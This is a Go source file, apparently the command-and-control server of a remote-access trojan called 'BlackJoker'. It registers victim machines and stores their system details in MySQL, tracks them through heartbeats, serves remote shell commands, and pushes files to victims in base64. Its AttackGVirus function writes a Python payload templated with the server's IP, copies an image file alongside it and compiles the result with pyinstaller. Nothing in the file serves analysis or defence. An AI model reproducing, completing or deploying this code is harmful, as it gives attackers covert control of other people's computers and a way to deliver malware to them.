package main

import (
	jsonOSsystemDB "BlackJoker/Mysql"
	VARBLACK "BlackJoker/VarData"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

type RoutingGroup struct{}

func ifAndObtainHostNameExistence(input string) string {
	parts := strings.Fields(input)
	if len(parts) >= 2 {
		hostname := parts[1]
		if findSession(hostname) {
			go func() {
				VARBLACK.FlagInTrue <- hostname
			}()
			go func() {
				VARBLACK.FlagInFalse = hostname
			}()
			return hostname
		}
	} else {
		fmt.Println("请输入BotName")
	}
	return ""
}

func (r *RoutingGroup) ReceiveClientInformation(c *gin.Context) {
	rawData, err := c.GetRawData()
	if err != nil {
		log.Println("接收客户端数据时出错:", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": "无法读取数据"})
		return
	}
	type ClientMessage struct {
		Message  string `json:"message"`  // 消息内容
		ClientID string `json:"clientID"` // 客户端 ID
	}
	var clientMsg ClientMessage
	if err := json.Unmarshal(rawData, &clientMsg); err != nil {
		log.Println("解析客户端数据失败:", err)
		c.JSON(http.StatusBadRequest, gin.H{"error": "数据格式错误"})
		return
	}
	fmt.Printf("--------------------%s--------------------\n%s\n--------------------%s--------------------\n", clientMsg.ClientID, clientMsg.Message, clientMsg.ClientID)
	select {
	case VARBLACK.ClientNotificationChannel <- true:
	default:
		log.Println("通知通道已满，无法通知主程序")
	}
	c.JSON(http.StatusOK, gin.H{"status": "success"})
}

func GetOutboundIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String(), nil
}

func initReadConfig() error {
	a, err := os.Executable()
	if err != nil {
		log.Println(err)
	}
	path := filepath.Join(filepath.Dir(a), "config.json")
	file, err := os.Open(path)
	if err != nil {
		log.Println(err)
	}
	defer file.Close()

	decoder := json.NewDecoder(file)
	err = decoder.Decode(&VARBLACK.Config)
	if err != nil {
		log.Println(err)
	}
	return err
}

//________________________________________________________________

func AttackGVirus() {
	goFilePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Failed to get executable path: %v", err)
	}
	sourceDir := filepath.Dir(goFilePath)
	mkdirPath := filepath.Join(sourceDir, "Virus")
	fileSpecPath := filepath.Join(mkdirPath, "setup.spec")
	filePyPath := filepath.Join(mkdirPath, "Virus.py")
	err = os.MkdirAll(mkdirPath, 0755)
	if err != nil {
		log.Fatalf("Failed to create directory: %v", err)
	}
	if err != nil {
		log.Fatalf("Failed to get outbound IP: %v", err)
	}
	formattedVirus := fmt.Sprintf(VARBLACK.Virus, VARBLACK.Config.ServerIp)

	file, err := os.Create(fileSpecPath)
	if err != nil {
		log.Fatalf("Failed to create file: %v", err)
	}
	defer file.Close()

	_, err = file.WriteString(VARBLACK.VarusSpec)
	if err != nil {
		log.Fatalf("Failed to write to file: %v", err)
	}

	virus, err := os.Create(filePyPath)
	if err != nil {
		log.Fatalf("Failed to create file: %v", err)
	}
	defer virus.Close()

	_, err = virus.WriteString(formattedVirus)
	if err != nil {
		log.Fatalf("Failed to write file: %v", err)
	}

	sourceFile := "R-Cadimn.jpg"
	destinationFile := filepath.Join(mkdirPath, "R-Cadimn.jpg")

	source, err := os.Open(sourceFile)
	if err != nil {
		panic(err)
	}
	defer source.Close()

	destination, err := os.Create(destinationFile)
	if err != nil {
		panic(err)
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	if err != nil {
		panic(err)
	}

	cmd := exec.Command("pyinstaller", fileSpecPath, "--distpath", ".\\")
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Println(err)
		log.Println("Shell:\n", string(out))
	}
}

func ObtainingSession(SessionName string) {
	Session := VARBLACK.SessionInfo{
		Name:      SessionName,
		Timestamp: time.Now(),
	}
	VARBLACK.Mu.Lock()
	VARBLACK.ObtainingOnlineNumberOfPeople = append(VARBLACK.ObtainingOnlineNumberOfPeople, Session)
	VARBLACK.Mu.Unlock()
	func() {
		cutoff := time.Now().Add(-3 * time.Minute)
		var newSlice []VARBLACK.SessionInfo
		VARBLACK.Mu.Lock()
		sessionMap := make(map[string]bool)
		for _, session := range VARBLACK.ObtainingOnlineNumberOfPeople {
			if session.Timestamp.After(cutoff) && !sessionMap[session.Name] {
				newSlice = append(newSlice, session)
				sessionMap[session.Name] = true
			}
		}
		VARBLACK.ObtainingOnlineNumberOfPeople = newSlice
		VARBLACK.Mu.Unlock()
	}()
}

func (r *RoutingGroup) HeartbeatHttp(c *gin.Context) {
	payload, err := c.GetRawData()
	if err != nil {
		c.String(http.StatusBadRequest, "无法获取数据Error")
		log.Println(err)
	}
	VARBLACK.Mu.Lock()
	VARBLACK.PendingRequestsMap[string(payload)] = VARBLACK.PendingRequests{
		Payload:    string(payload),
		ReceivedAt: time.Now(),
	}
	VARBLACK.Mu.Unlock()

	F := jsonOSsystemDB.CheckCookieExists(string(payload))
	switch F {
	case true:
		// 找到了
		ObtainingSession(string(payload))
		c.Status(http.StatusOK)
	case false:
		log.Println(err)
		// 没找到
		c.Status(http.StatusBadRequest)
	}
}
func (r *RoutingGroup) InitCookie(c *gin.Context) {
	var OSkull VARBLACK.OSini
	if err := c.BindJSON(&OSkull); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	}
	json := OSkull.Cookie + "|" + OSkull.SystemName + "|" + OSkull.SysPath + "|" + OSkull.Cpu + "|" + OSkull.CpuArchItecture + "|" + OSkull.IP + "|" + OSkull.AdminName
	c.Status(http.StatusOK)
	go r.Mysql(json)
}
func (r *RoutingGroup) Mysql(json string) {
	jsonOSystem := make(chan string, 10)
	go func() {
		jsonOSystem <- json
	}()
	select {
	case jsonOS := <-jsonOSystem:
		err := jsonOSsystemDB.MysqlMain(jsonOS)
		if err != nil {
			log.Println(err)
		}
	case <-time.After(20 * time.Second):
		log.Println("超时,jsonOSystemDta没有发送过来!")
	}
}
func findSession(adminCookie string) bool {
	VARBLACK.Mu.Lock()
	defer VARBLACK.Mu.Unlock()
	for _, info := range VARBLACK.ObtainingOnlineNumberOfPeople {
		if adminCookie == info.Name {
			for _, req := range VARBLACK.PendingRequestsMap {
				if req.Payload == adminCookie {
					return true
				}
			}
			break
		}
	}
	fmt.Println("找不到该Session或对应的请求")
	return false
}
func (r *RoutingGroup) AttackShell(c *gin.Context) {
	timeout := time.After(time.Hour * 24)
	if !VARBLACK.FlagBool {
		select {
		case adminCookie := <-VARBLACK.FlagInTrue:
			{
				_ = findSession(adminCookie)
				CommandStr := <-VARBLACK.Command
				c.String(http.StatusOK, CommandStr)
			}
		case <-timeout:
			{
				log.Println("AttackShell flag通道超时!非超时异常错误!")
			}
		}
	} else {
		flag2_ := VARBLACK.FlagInFalse
		adminCookies, _ := c.GetRawData()
		if string(adminCookies) == flag2_ {
			CommandStr := <-VARBLACK.Command
			c.String(http.StatusOK, CommandStr)
		} else {
			_ = 0
		}
	}
}

func (r *RoutingGroup) AttackUploadLocalFile(c *gin.Context) {
	filePath := <-VARBLACK.UploadFile
	file, err := os.Open(filePath)
	if err != nil {
		log.Println("无法打开文件", err)
		return
	}
	defer file.Close()
	fileData, err := io.ReadAll(file)
	if err != nil {
		log.Println("获取文件错误", err)
	}
	fileDataBase64 := base64.StdEncoding.EncodeToString(fileData)
	c.JSON(http.StatusOK, gin.H{
		"fileServerPath":        filePath,
		"fileDataBase64":        fileDataBase64,
		"WallpaperOrUploadFile": VARBLACK.WallpaperOrUploadFileFlag,
	})
}

func ServerInit() {
	router := gin.New()
	api := router.Group("/api")
	RoutingGroup := RoutingGroup{}
	//-----------------------------------------------------------//
	go api.POST("/init/receive", RoutingGroup.ReceiveClientInformation)
	go api.POST("/init/cookie", RoutingGroup.InitCookie)
	go api.POST("/HeartbeatHttp", RoutingGroup.HeartbeatHttp)
	go api.POST("/ShellOsHttp", RoutingGroup.AttackShell)
	go api.POST("/Attack/Upload", RoutingGroup.AttackUploadLocalFile)
	//-----------------------------------------------------------//
	err := router.Run(":5264")
	if err != nil {
		log.Println("Server启动错误:", err)
		return
	}
}
func main() {
	err := initReadConfig()
	if err != nil {
		log.Println(err)
	}
	go ServerInit()
	go func() {
		InteractiveMain()
	}()
	select {}
}
